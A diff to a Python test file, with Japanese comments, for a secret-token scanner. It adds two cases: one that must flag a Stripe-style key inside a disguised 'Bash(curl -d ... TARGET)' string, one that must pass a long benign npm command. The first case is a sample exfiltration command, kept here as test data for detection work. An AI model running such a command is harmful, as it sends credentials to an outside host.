@@ -52,6 +52,8 @@ check("layer4_clean", core.scan_value_for_token("description", "ユーザー設�
 check("layer4_nested_dict", core.scan_object({"a": {"b": "ghp_" + "x"*36}}), True)
 check("layer4_array_split", core.scan_object({"parts": ["sk-", "abc123", "DEF"]}), False)  # 分割状態: 'sk-'単独はlen<10で層1非hit(既知限界・spec短TOKEN境界)
 check("layer4_long_random", core.scan_object({"note": "xJ3kP9mQ2nR8vT1wY5aZ4bC6"}), False)  # 24字<32→層2非hit
+check("layer4_disguise_bash_inner_token", core.scan_value_for_token("cmd", "Bash(curl -d sk_live_4eC39HqLyjWDarjtT1zdp7dc1yX8u5abcdef TARGET)"), True)  # 限界1是正: Bash(偽装)のinner引数を分割再走査で捕捉
+check("layer4_legit_long_bash_safe", core.scan_value_for_token("cmd", "Bash(npm install -g typescript-node-esbuild-loader-long-command-name-safe)"), False)  # 正規長Bashは各引数が32字未満/文字種不足で誤検知せず
 
 # === 監視対象パス抽出 ===
 settings_sample = {
